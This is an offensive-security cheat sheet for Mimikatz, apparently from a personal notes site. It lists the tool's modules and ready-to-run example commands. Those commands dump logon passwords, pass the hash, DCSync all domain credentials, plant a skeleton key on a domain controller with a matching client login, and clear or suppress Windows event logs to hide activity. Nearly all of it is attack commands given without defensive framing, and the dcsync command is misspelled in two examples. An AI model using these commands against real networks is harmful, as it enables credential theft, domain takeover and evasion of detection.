# [Mimikatz](https://adsecurity.org/?page_id=1821)
[See also John the Ripper](john_the_ripper.html)

## Start and elevate privilege
    privilege::debug
    token::elevate

## sekurlsa

### Commands
> Module :        sekurlsa
> 
> Full name :     SekurLSA module
> 
> Description :   Some commands to enumerate credentials...
> 
    msv  -  Lists LM & NTLM credentials
    wdigest  -  Lists WDigest credentials
    kerberos  -  Lists Kerberos credentials
    tspkg  -  Lists TsPkg credentials
    livessp  -  Lists LiveSSP credentials
    ssp  -  Lists SSP credentials
    logonPasswords  -  Lists all available providers credentials
    process  -  Switch (or reinit) to LSASS process  context
    minidump  -  Switch (or reinit) to LSASS minidump context
    bootkey  -  Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials
    pth  -  Pass-the-hash
    krbtgt  -  krbtgt!
    dpapisystem  -  DPAPI_SYSTEM secret
    trust  -  Antisocial
    backupkeys  -  Preferred Backup Master keys
    tickets  -  List Kerberos tickets
    ekeys  -  List Kerberos Encryption Keys
    dpapi  -  List Cached MasterKeys
    credman  -  List Credentials Manager

### Example(s)
    sekurlsa::logonpasswords
    sekurlsa::pth /user:joe.random.user /domain:hacked.com /ntlm:a2739984965f79d7bae1c76511258b5c

## Process
### Commands
> Module :        process
> 
> Full name :     Process module
> 
	    list  -  List process
	    exports  -  List exports
	    imports  -  List imports
	    start  -  Start a process
	    stop  -  Terminate a process
	    suspend  -  Suspend a process
	    resume  -  Resume a process
	    run  -  Run!
	    runp -

### Example(s)
    process::list
    process::start notepad

## lsadump::
### Commands
> Module :        lsadump
>
> Full name :     LsaDump module
>
>           		 sam  -  Get the SysKey to decrypt SAM entries (from registry or hives)
>              secrets  -  Get the SysKey to decrypt SECRETS entries (from registry or hives)
>                cache  -  Get the SysKey to decrypt NL$KM then MSCache(v2) (from registry or hives)
>                  lsa  -  Ask LSA Server to retrieve SAM/AD entries (normal, patch on the fly or inject)
>                trust  -  Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly)
>           backupkeys
>               rpdata
>               dcsync  -  Ask a DC to synchronize an object
>             dcshadow  -  They told me I could be anything I wanted, so I became a domain controller
>              setntlm  -  Ask a server to set a new password/ntlm for one user
>           changentlm  -  Ask a server to set a new password/ntlm for one user
>              netsync  -  Ask a DC to send current and previous NTLM hash of DC/SRV/WKS
>             packages
>                  mbc
>    

### Example(s)
    token::elevate /domainadmin
    lsadump::dcsysnc /all /csv
    lsadump::dcsysnc /domain:hacked.com /user:Administrator


## misc::skeleton
N.B. MUST be done on the DC

At the DC:

    privilege::debug
    token::elevate
    misc::skeleton

At the client:

    net use Y: \\mydc\admin$ /user:hacker Password123!


## Other modules
### ts::
> Module :        ts
> 
> Full name :     Terminal Server module
> 
    	multirdp  -  [experimental] patch Terminal Server service to allow multiples users
    	sessions
    	remote

### net::
> Module :        net
> 
> Full name :
> 
>             user  -
>            group  -
>            alias  -
>          session  -
>         wsession  -
>              tod  -
>            stats  -
>            share  -
>       serverinfo  -
>            trust  -
>            deleg  -

### event::
> Module :        event
> 
> Full name :     Event module
> 
>             drop  -  [experimental] patch Events service to avoid new events
>            clear  -  Clear an event log